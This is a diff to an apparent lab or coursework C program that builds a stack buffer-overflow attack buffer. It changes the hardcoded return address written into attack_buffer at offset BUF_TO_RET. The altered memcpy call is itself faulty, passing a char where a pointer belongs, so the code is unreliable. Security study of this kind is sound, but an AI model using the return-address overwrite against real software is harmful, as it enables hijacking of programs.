@@ -26,7 +26,7 @@ main ( int argc, char * argv[] )
 	// *ret_address = 0x2021feb0;
 	// attack_buffer[BUF_SIZE - 1] = '\0';
 
-	int target = 0x2021feb0;
+	int target = 0x2021fe10;
 	// char *ptr = (char*)0x2021feb0;
 
 	// for(int i = 0; i < 6; i++){
@@ -37,7 +37,7 @@ main ( int argc, char * argv[] )
 	attack_buffer[BUF_TO_RET + 2] = (char) ((target >> 16) & 0xff);
 	attack_buffer[BUF_TO_RET + 3] = (char) ((target >> 24) & 0xff);
 
-	memcpy(attack_buffer[BUF_TO_RET], (char *)target, sizeof((char *)target));
+	memcpy(attack_buffer[BUF_TO_RET], (char *)0x2021fe10, sizeof((char *)0x2021fe10));
 
 	printf("attack_buffer %s\n",attack_buffer);
 	printf("%x%x%x%x\n",attack_buffer[BUF_TO_RET],
